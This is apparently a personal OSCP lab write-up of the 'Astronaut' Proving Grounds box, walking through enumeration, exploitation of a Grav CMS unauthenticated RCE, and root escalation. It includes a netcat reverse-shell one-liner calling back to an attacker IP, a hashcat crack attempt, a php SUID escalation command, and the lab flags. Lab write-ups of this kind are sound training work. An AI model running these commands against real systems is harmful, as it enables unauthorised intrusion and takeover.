---
title: OSCP - Astronaut - Linux
created: 2026-01-26
updated: 2026-01-22
status: seed
draft: false
tags:
  - Cybersecurity
Related: "[[Cybersecurity]]"
---
# Astronaut
Much quicker and more useful experience than `Exfiltrated`. Did my own enumeration, and used the [walkthrough](https://medium.com/@ardian.danny/oscp-practice-series-20-proving-grounds-astronaut-627bc41a86ef) only as a guide when getting stuck. 

Discovering "blind" exploits was interesting, however it made sense that if the exploit isn't generating any output and not creating a reverse shell, that you might need to add a `-c` command with a line of bash to establish a reverse shell instead. Although once again all the instructions were in the script if you looked - ***always read the script!***

It's been awhile since I did Linux Priv Esc too, so refreshing that was handy - I've added a few extra details to the Linux PrivEsc section of the cheatsheet, but I suspect it'll be polished up as I do more Linux boxes.

# Resolution summary
- Ran nmap to find SSH & HTTP (Targeted HTTP for initial enumeration)
- Default installation of `grav-admin`, identified potential exploit
- Ran exploit without output
	- Determined it was blind and ran again with a reverse shell command
	- Achieved shell and enumerated server
- Identified privilege escalation through `php7.4` binary using `SUID`
	- Achieved root access and printed `proof.txt`
## Improved skills
- Abusing Linux binaries
- Running a blind exploit
## Used tools
- nmap
- gobuster
- Hashcat

---

# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN nmap 192.168.155.12 -v
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:46
Completed NSE at 20:46, 0.00s elapsed
Initiating NSE at 20:46
Completed NSE at 20:46, 0.00s elapsed
Initiating NSE at 20:46
Completed NSE at 20:46, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.23 seconds
           Raw packets sent: 1235 (54.316KB) | Rcvd: 1018 (40.716KB)
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 8.2p1)
No enumeration conducted
## Port 80 - HTTP (Apache/2.4.41)
- Visited `192.168.155.12` with Firefox
![OSCP - Astronaut - Linux - image1](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image1.png)
- Found default installation page for `grav-admin`
	- *Grav CMS is vulnerable to CVE-2021-21425  (Unauthenticated RCE)*
![OSCP - Astronaut - Linux - image2](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image2.png)
- Returned to terminal and ran `gobuster` against target:
  `gobuster dir -u  http://192.168.155.12/grav-admin -w //usr/share/dirb/wordlists/big.txt`
 ![OSCP - Astronaut - Linux - image3](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image3.png)
---
# Exploitation
## CVE-2021-21425  (Unauthenticated RCE)
- Identified exploit `49973.py`
- Modified exploit to suit target and local system
![OSCP - Astronaut - Linux - image4](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image4.png)
- Launched netcat listener: `nc -nvlp 4444`
- Ran `49973.py` with reverse shell command & established initial access:
  `python3 49973.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.198 4444 >/tmp/f' -t http://192.168.155.12/grav-admin` 
![OSCP - Astronaut - Linux - image5](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image5.png)
---
# Lateral Movement to user
## Local Enumeration
- Enumerated files to find `admin` user with password hash `$2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.`
![OSCP - Astronaut - Linux - image6](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image6.png)
	- Hash identified as `bcrypt`
![OSCP - Astronaut - Linux - image7](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image7.png)
	- Attempted to cracked with Hashcat:
  `hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt --force`
		- Cancelled: Expected to completion >3 days
- Enumerated `/etc/passwd`
![OSCP - Astronaut - Linux - image8](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image8.png)
	- Identified user `alex:x:1000:1000::/home/alex:/bin/bash`
		- Unable to access `/home/alex`
		![OSCP - Astronaut - Linux - image9](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image9.png)
---
# Privilege Escalation
## Local Enumeration
Attempted to upload `linpeas.sh` without success
![OSCP - Astronaut - Linux - image10](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image10.png)
Enumerated binary permissions
![OSCP - Astronaut - Linux - image11](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image11.png)
## Privilege Escalation vector
Checked GTFO bins for potential privilege escalation
	- `php` with `SUID` bit set [GTFObins](https://gtfobins.github.io/gtfobins/php/#suid)
```
CMD="/bin/sh"`
./php -r "pcntl_exec('/bin/sh', ['-p']);"`
```
- Achieved root access through privilege escalation & printed `proof.txt`
![OSCP - Astronaut - Linux - image12](/files/OSCP%20-%20Astronaut%20-%20Linux%20-%20image12.png)
---
# Trophy & Loot
`flag1.txt` = `T2Zmc2Vj`
`proof.txt` = `bf9dd3d702bddd63bd4c931118340192`

